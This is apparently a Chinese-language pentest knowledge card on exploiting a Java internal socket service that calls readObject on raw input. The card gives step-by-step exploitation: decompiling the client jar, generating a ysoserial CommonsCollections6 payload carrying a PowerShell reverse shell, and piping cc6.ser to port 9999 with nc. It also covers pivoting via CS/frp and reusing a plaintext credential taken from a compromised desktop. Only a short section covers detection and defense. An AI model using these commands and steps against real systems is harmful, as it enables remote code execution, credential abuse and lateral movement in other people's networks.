---
id: web-java-deser-socket-objectinputstream-ysoserial-nc
title: 内网自研 Java 服务 socket 流直接 readObject：ysoserial CC6 生成 .ser 经 nc 管道直发端口 RCE
type: scenario
domain: web
path: web/java/deserialization
technique: java-socket-objectinputstream-ysoserial-nc-pipe-rce
aliases:
- socket 反序列化
- ObjectInputStream(socket.getInputStream())
- 内网 Java 服务反序列化
- ysoserial CommonsCollections6
- nc 管道发送序列化数据
- chat jar 反序列化
- jd-gui 反编译客户端找反序列化
tags:
- java
- deserialization
- socket
- objectinputstream
- ysoserial
- commons-collections
- cc6
- nc
- lateral-movement
- internal
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V666
  verified_at: '2026-11-13T08:49:03+08:00'
  notes: 已对照原文52图核对并修正前置信息：账号.txt/jar 位于已控 WEB 主机桌面（聊天服务端在 data 192.168.22.146:9999）；客户端反编译截图（new Socket(192.168.22.146,9999)+ObjectOutputStream.writeObject+ObjectInputStream.readObject）与文章服务端 readObject 片段一致；ysoserial-1.5-su18-all.jar CommonsCollections6+powershell -e、本地弹计算器、cc6.ser、nc64 管道投递与反弹 shell 均有截图。与 Log4j SimpleSocketServer 卡（CVE-2019-17571 SocketNode）差异成立：本卡为内网自研聊天服务、无 Log4j/长度前缀，需反编译确认协议。待验证：服务端是否每次先读登录对象、一次性利用风险原文已提示；PoC 未在本机执行。
---

# 一句话结论

内网自研 Java 服务（案例聊天系统 jar）在监听端口上把客户端输入直接包成 `ObjectInputStream` 并 `readObject`，且目标 JVM 为 JDK 1.8.0_65、classpath 带 commons-collections 3.2.1；反编译客户端确认协议后，用 ysoserial 生成 CommonsCollections6 的序列化字节（.ser），通过 `type cc6.ser | nc64.exe -nv <host> <port>` 把字节流直接发给服务端口，即可在服务端 JVM 执行任意命令并反弹 shell（案例随后 CS 上线 data 主机）。

# 原理

- **socket 上的原生反序列化**：案例聊天系统的客户端 `UserClientService.checkUser` 建立 `new Socket(InetAddress.getByName("192.168.22.146"), 9999)`，用 `ObjectOutputStream.writeObject(user)` 发送登录对象、再用 `ObjectInputStream.readObject()` 读取 `Message`。客户端与服务器用 Java 原生序列化通信，说明服务端在 socket 流上做 `readObject`——这是与 HTTP/组件漏洞无关的“纯 TCP 反序列化入口”。
- **无过滤 + 可用 gadget**：反编译 jar（jd-gui）可见服务端接收登录信息同样走 `ObjectInputStream`；文章环境为 **JDK 1.8.0_65 + commons-collections 3.2.1**，CC1/CC6 等 CommonsCollections 链均可用。文章用 ysoserial 的 `CommonsCollections6`（不依赖 TemplatesImpl/JDK patch 差异，适合该环境）生成载荷，并先在本机弹计算器验证（`Transformer[]` 的 ConstantTransformer → InvokerTransformer(getMethod/invoke) → Runtime.exec 链）。
- **投递方式**：因为是纯 Java 序列化流，不需要 HTTP 包装——Windows 下 `type cc6.ser | nc64.exe -nv <host> <port>`、Linux 下 `nc <host> <port> < cc6.ser` 即可把 ysoserial 生成的 `.ser` 原样送入 socket。服务端 `readObject` 在业务类型转换之前执行 gadget，即使随后强转/类型检查抛异常导致连接或服务异常，命令已经执行。
- **一次性利用风险**：文章提到服务端在转换类型时异常退出，可能“用过一次之后就不能使用”，所以要先本地验证 payload，再一次性打成功（案例先弹计算器、再发 cc6 到 9999 端口拿到反弹 shell）。
- **前置信息**：案例从已控 WEB 主机（第一台跳板）桌面 `账号.txt`（`moonsec 123456`）拿到客户端登录口令，并用该口令操作客户端确认协议；真实场景也可只靠反编译 jar 或抓包确认序列化格式。

# 触发条件

- 目标内网服务监听 TCP 端口，收到的字节流被直接交给 `ObjectInputStream.readObject`（无 SerializationFilter/类白名单，或可绕过）。
- classpath 存在可用 gadget（案例 commons-collections 3.2.1 + JDK 1.8.0_65；不同版本选 CC1/CC5/CC6/CC7 等）。
- 攻击者可达该端口（案例经 CS/frp 代理进入 192.168.22.0/24）。
- 若服务端先读取其它对象/长度前缀再 readObject，需要按协议先发送对应前缀（否则参考长度前缀 RPC 卡先探测协议）。

# 利用步骤

1. 内网发现与取证：端口扫描/桌面文件（案例 `账号.txt`）获取服务地址、端口与客户端账号；下载对应 jar。
2. 用 jd-gui 反编译客户端/服务端，定位 `new Socket(...)`、`ObjectOutputStream.writeObject`、`ObjectInputStream.readObject`，确认服务端也在同一流上反序列化，并查看依赖版本（JDK、commons-collections）。
3. 本地验证 gadget：用 ysoserial 生成 CC6 载荷并弹计算器，确认版本匹配。
4. 生成攻击载荷：`java -jar ysoserial-1.5-su18-all.jar -g CommonsCollections6 -p "powershell -e <base64>" > cc6.ser`（或 `cmd.exe /c ...`）。
5. 投递：`type cc6.ser | nc64.exe -nv <target> 9999`（Windows）或 `nc <target> 9999 < cc6.ser`（Linux）。
6. 监听端收到反弹 shell/CS beacon；案例后续用该主机为跳板进入 10.10.10.0/24 域网段。

# PoC

```text
# 生成 CC6 序列化载荷（JDK 1.8.0_65 + commons-collections 3.2.1 环境）
java -jar ysoserial-1.5-su18-all.jar -g CommonsCollections6 -p "powershell -e <base64反弹命令>" > cc6.ser

# Windows 上把 .ser 字节流直接灌入目标 socket 服务
type C:\path\cc6.ser | nc64.exe -nv 192.168.22.146 9999
# Linux 等价：nc 192.168.22.146 9999 < cc6.ser
```

# 变体与关联

- 与库内 `web-java-deserialization-log4j1-simplesocketserver-cve-2019-17571` 同为“raw socket → ObjectInputStream → ysoserial + nc”模式：那张卡是 Log4j SimpleSocketServer 组件特定 CVE；本卡是内网自研服务（聊天 jar）的通用场景，需先从客户端 jar 反推协议与反序列化点，组件与 PoC 均不同。
- 与 `web-java-deser-custom-length-prefix-serialization-endpoint-discovery` 互补：若服务端先读 Integer 长度前缀再 readObject，需按该协议封装（`serialized(Integer length) + serialized(payload)`），否则直接灌 .ser 会失败。
- gadget 选择：JDK 8u65 + CC 3.2.1 可用 CC1（AnnotationInvocationHandler）、CC5/CC6/CC7；有 TemplatesImpl 限制时优先 CC6；其它依赖（CommonsBeanutils、C3P0 等）可换用对应链。
- 投递工具变体：impacket 无此场景，常用 nc/ncat/powershell TcpClient 直接把文件字节写入 socket；也可用 python socket 发送。

# 检测与防御

- 服务端不要对不可信网络输入做 Java 原生反序列化：改用 JSON/Protobuf 等数据协议；必须保留时设置 `ObjectInputFilter` 类白名单并拒绝 CommonsCollections 等危险类。
- 升级/移除 commons-collections 3.2.1 等危险 gadget 依赖（3.2.2+ 或 4.x 的受限链），限制内部服务端口暴露（防火墙/网络分区）。
- 检测：端口出现以 `\xac\xed\x00\x05` 开头的流量（Java 序列化魔数）；JVM 异常栈 `ObjectInputStream.readObject → org.apache.commons.collections.Transformer`；服务进程异常退出后伴随反弹连接；内网主机对非 HTTP 端口的 nc 直连。

# 待验证点

- 文章的服务器端源码未完整展示（仅客户端与服务端 readObject 片段），服务端是否每次都先读登录对象、是否可重复利用未逐一确认；文章明确提到“服务可能用过一次就不能用”，卡内已按一次性利用风险提示。
